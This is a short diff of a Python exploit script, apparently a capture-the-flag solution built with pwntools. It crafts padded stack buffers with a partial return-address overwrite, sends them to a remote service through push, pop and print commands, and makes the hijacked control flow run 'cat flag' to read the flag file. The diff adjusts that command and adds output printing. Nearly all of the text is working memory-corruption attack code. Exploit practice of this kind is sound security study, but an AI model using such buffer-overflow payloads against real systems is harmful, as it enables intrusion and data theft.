@@ -218,7 +218,7 @@ def local_cat_stack_run():
     
 def remote_cat_stack_run():
     #name = b'\\bin\\sh' 
-    name = b'cat flag.txt' 
+    name = b'cat flag' 
     stack_buffer_1 = b'A'*0x244 + b'X'*8
     stack_buffer_2 = b'C'*0x244 + b'Y'*4 
     stack_buffer_2 += b'\xc0\x19' #RIP if we call print
@@ -230,10 +230,12 @@ def remote_cat_stack_run():
     p.sendline(b'pop 1')
     print(p.recv())
     p.sendline(b'push ' + stack_buffer_2)
-    p.recv()
+    print(p.recv())
     p.sendline(b'print')
     print(p.recv())
     print(p.recv())
+    print(p.recv())
+    #p.interactive()
 
 if __name__=='__main__':
     #initial_heap_overflow()
